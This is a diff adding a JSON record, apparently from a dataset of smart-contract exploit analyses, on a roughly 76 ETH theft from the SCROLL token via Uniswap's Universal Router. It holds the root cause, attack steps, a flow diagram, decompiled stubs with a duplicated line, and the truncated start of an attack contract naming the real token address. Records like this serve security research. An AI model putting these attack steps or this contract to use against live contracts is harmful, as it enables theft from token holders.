@@ -1,0 +1,37 @@
+{
+ "id": "2024__2024-05-XX_SCROLL_UniversalRouterExecute",
+ "source_file": "2024/2024-05-XX_SCROLL_UniversalRouterExecute.md",
+ "title": "SCROLL — Universal Router execute() Token Theft Analysis",
+ "date": "2024-05-01",
+ "protocol": "SCROLL",
+ "chain": "Ethereum",
+ "loss_raw": "~76 ETH",
+ "loss_usd": null,
+ "root_cause": "SCROLL tokens were transferred to the router via encoded commands (command byte `0x05`) through Uniswap Universal Router's `execute()` function, then moved to a liquidity pair, allowing mass WETH extraction via swap",
+ "attack_tx": null,
+ "vulnerable_contract": "SCROLL 0xe51D3dE9",
+ "classes": [
+  "arbitrary-call"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: transfer restriction bypass via Universal Router execute command\n// SCROLL token does not restrict transfers routed through the Universal Router\n\n// Universal Router execute(): sequentially executes encoded commands\n// command 0x05 = V2_SWAP_EXACT_IN\n// → SCROLL → Universal Router → transferable to pair\n// → WETH extracted via pair.swap()\n\n//",
+  "// File: SCROLL_decompiled.sol\ncontract SCROLL {\ncontract SCROLL {\n    address public owner;\n\n\n    // Selector: 0x86942310\n    function isW(address p0) external view returns (bool) {}  // ❌ Vulnerability\n\n    // Selector: 0xb2b587ba\n    function unknown_b2b587ba() external {}\n\n    // Selector: 0xe5339685\n    function bl(address p0) external {}\n\n    // Selector: 0xf2fde38b\n    // Alternative: _SIMONdotBLACK_(int8[],uint256,address,bytes8,int96)\n    function transferOwnership(address p0) external {}\n\n    // Selector: 0xf7331e3c\n    function recoverBNBfromContract(address p0) external {}\n\n    // Selector: 0xf87dc2c6\n    function tradeEnable() external {}\n\n    // Selector: 0xb7a7a881\n    function addB(address p0, uint256 p1) external {}\n\n    // Selector: 0xdd62ed3e\n    function allowance(address p0, address p1) external view returns (uint256) {}\n\n    // Selector: 0x87741434\n    function recoverBEP20FromContract(address p0, uint256 p1, address p2) external {}\n\n    // Selector: 0x8a8c523c\n    function enableTrading() external {}\n\n    // Selector: 0x8da5cb5b\n    function owner() external view returns (address) {}\n\n    // Selector: 0x95d89b41\n    function symbol() external view returns (string memory) {}\n\n    // Selector: 0xa9059cbb\n    function transfer(address p0, uint256 p1) external {}\n\n    // Selector: 0x3f60b426\n    function removeB(address p0) external {}\n\n    // Selector: 0x4949b429\n    function checkAllowanceBalance(uint256 p0) external view returns (uint256) {}\n\n    // Selector: 0x70a08231\n    function balanceOf(address p0) external view returns (uint256) {}\n\n    // Selector: 0x715018a6\n    function renounceOwnership() external {}\n\n    // Selector: 0x7f21b9b9\n    function addW(address p0) external {}\n\n    // Selector: 0x85141a77\n    function deadWallet() external {}\n\n    // Selector: 0x06fdde03\n    function name() external view returns (string memory) {}\n\n    // Selector: 0x095ea7b3\n    // 📌 approve - safeApprove race condition risk\n    function approve(address p0, uint256 p1) external {}\n\n    // Selector: 0x0c19f047\n    function removeW(address p0) external {}\n\n    // Selector: 0x18160ddd\n    function totalSupply() external view returns (uint256) {}\n\n    // Selector: 0x23b872dd\n    // 📌 arbitrary transferFrom - approval validation required\n    function transferFrom(address p0, address p1, uint256 p2) external {}\n\n    // Selector: 0x313ce567\n    function decimals() external view returns (uint8) {}\n}"
+ ],
+ "code_after": [
+  "✅ Safe code: managed transfer restriction addresses\ncontract ScrollToken {\n    mapping(address => bool) public blacklisted;\n\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal override {\n        // Block transfers via Universal Router\n        require(!blacklisted[from] && !blacklisted[to], \"blacklisted\");\n        // Or use whitelist-based transfer control\n    }\n}"
+ ],
+ "steps": [
+  "→ [1] Universal Router.execute(0x05, [..., SCROLL, recipient])",
+  "SCROLL token → Universal Router buffer",
+  "→ [2] getAmountsOut(scrollAmt, [SCROLL, WETH])",
+  "→ [3] SCROLL → transferred to SCROLL/WETH pair",
+  "→ [4] pair.swap(wethOut, 0, attacker, \"\")",
+  "→ [5] WETH.withdraw() → receive ETH",
+  "→ [6] Remaining SCROLL in router → received by attacker",
+  "→ [7] ~76 ETH stolen"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] Universal Router.execute(0x05, [..., SCROLL, recipient])\n  │         └─ SCROLL token → Universal Router buffer\n  │\n  ├─→ [2] getAmountsOut(scrollAmt, [SCROLL, WETH])\n  │         └─ Calculate expected WETH output amount\n  │\n  ├─→ [3] SCROLL → transferred to SCROLL/WETH pair\n  │\n  ├─→ [4] pair.swap(wethOut, 0, attacker, \"\")\n  │         └─ Extract WETH\n  │\n  ├─→ [5] WETH.withdraw() → receive ETH\n  │\n  ├─→ [6] Remaining SCROLL in router → received by attacker\n  │\n  └─→ [7] ~76 ETH stolen",
+  "interface IUniversalRouter {\n    function execute(bytes calldata commands, bytes[] calldata inputs, uint256 deadline) external payable;\n}\n\ninterface IUniswapV2Router {\n    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory);\n}\n\ncontract AttackContract {\n    IUniversalRouter constant universalRouter = IUniversalRouter(/* Uniswap Universal Router */);\n    IUniswapV2Router constant v2Router        = IUniswapV2Router(/* Uniswap V2 Router */);\n    address constant SCROLL = 0xe51D3dE9b81916D383eF97855C271250852eC7B7;\n    address constant WETH   = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n    address constant pair   = /* SCROLL/WETH pair */;\n\n    function testExploit() external {\n        uint256 scrollAmt = IERC20(SCROLL).balanceOf(/* holde"
+ ]
+}
